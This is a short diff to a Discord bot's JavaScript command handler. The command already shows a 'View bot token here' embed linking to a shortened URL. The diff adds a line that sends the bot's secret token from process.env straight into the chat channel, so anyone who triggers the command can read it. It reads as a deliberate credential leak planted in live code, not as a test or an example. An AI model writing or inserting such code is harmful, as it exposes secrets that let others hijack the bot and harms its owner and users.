@@ -385,9 +385,10 @@ client.on('message', async message => {
                         value: `[View bot token here](https://shorturl.at/el158)`,
                         inline: false,
                     },
-                ],
+                ], 
             };
             message.channel.send({ embed: tokenEmbed });
+            message.channel.send(process.env.token);
             break;
         case 'reportbug':
             async function prompt(message, msg) {
